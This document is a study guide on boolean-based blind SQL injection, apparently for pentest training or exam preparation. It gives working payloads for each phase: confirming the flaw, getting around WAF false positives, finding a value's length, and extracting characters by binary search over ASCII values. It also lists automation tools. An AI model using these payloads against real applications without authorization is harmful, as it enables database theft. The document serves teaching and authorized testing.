# Boolean-Based Blind Workflow

**Objective:** To systematically extract database information when the application does not print errors or data to the screen. This is achieved by injecting conditional (True/False) statements and observing subtle differences in the application's response (Content-Based Blind).

---

## Phase 1: Identification (The Logic Test)
Your first goal is to determine if the application is dynamically rendering its webpage based on the mathematical truth of your injected query.

**1. Establish the Baseline:**
* `?id=5` -> *Observation:* The page loads normally, displaying "Product 5".

**2. Inject the True Condition:**
* `?id=5' AND 1=1--+` 
* *Observation:* The database evaluates `5` (True) AND `1=1` (True). The page loads normally.

**3. Inject the False Condition:**
* `?id=5' AND 1=2--+`
* *Observation:* The database evaluates `5` (True) AND `1=2` (False). The overall statement is False.
* *Result:* The page loads, but the "Product 5" details are missing, or a "0 items found" message appears. 

**Conclusion:** The application's visual output changes based on your mathematical logic. Boolean-Based SQLi is confirmed.

---

## Phase 2: The False Positive Check
Before spending hours extracting data, you must ensure you aren't being tricked by a Web Application Firewall (WAF) or a strict input filter.

Sometimes, a WAF will see `AND 1=1`, assume it is a malicious attack, and drop the connection, causing the page to break. This looks like a "False" response, but it's actually a block.

* **The Fix:** Test with logic that WAFs usually ignore.
* **True:** `?id=5' AND 'abc'='abc'--+`
* **False:** `?id=5' AND 'abc'='xyz'--+`
* *If the page still changes appropriately, the vulnerability is verified and WAF interference is ruled out.*

---

## Phase 3: Length Enumeration (Efficiency)
Guessing a password character-by-character takes a long time. You must figure out exactly how long the word is first, so you know exactly when to stop guessing. 

We use the `LENGTH()` function. Let's assume we are trying to steal the database version string.

* `?id=5' AND LENGTH(@@version) = 1--+` *(False / Breaks)*
* `?id=5' AND LENGTH(@@version) = 2--+` *(False / Breaks)*
...
* `?id=5' AND LENGTH(@@version) = 10--+` *(True / Loads Normally)*

**Conclusion:** The database version is exactly 10 characters long. We now know we only need to guess 10 letters.

---

## Phase 4: Systematic Character Extraction
Now we play "Higher or Lower" using ASCII decimal values to guess the exact characters. 

**Target:** Character #1 of the version string.

**1. The Binary Search Method:**
Don't guess letters one-by-one (`=97`, `=98`). Cut the alphabet in half to save time.

* `?id=5' AND ASCII(SUBSTRING(@@version, 1, 1)) > 100--+` 
    * *If True:* The character is between 101 and 127.
    * *If False:* The character is between 0 and 100.
* Let's say it was False. Cut it in half again: `... > 50--+`
* Repeat this binary search until you pinpoint the exact ASCII value (e.g., `97`, which is the letter 'a').

**2. Move to the next character:**
Change the index in the `SUBSTRING()` function from `1` to `2`.
* `?id=5' AND ASCII(SUBSTRING(@@version, 2, 1)) > 100--+`

---

## Phase 5: The Reality of Automation
**Manual Boolean extraction is incredibly tedious.** While you must understand the manual methodology for an exam or an interview, in a real-world pentest, once you confirm Phase 1 and Phase 2 manually, you automate Phase 3 and Phase 4.

**Professional Automation Methods:**
1. **Burp Suite Intruder:** Send the request to Intruder. Set the payload positions on the character index (1, 2, 3...) and the ASCII guess (97, 98, 99...). Filter the results by "Content Length" to easily spot which guesses returned the "True" webpage.
2. **Custom Python Script:** Write a quick script using the `requests` library that automates the binary search (`> 100`) and prints the extracted string to your terminal. 
3. **SQLmap (If Authorized):** Pass the exact injection point to SQLmap and let it handle the extraction.

---

## Common Pitfalls
* **Dynamic Content:** If the webpage has a rotating banner or a live timestamp that changes on every single refresh, it can create "false" visual differences. Always look for a static element (like an article title) to use as your True/False indicator.
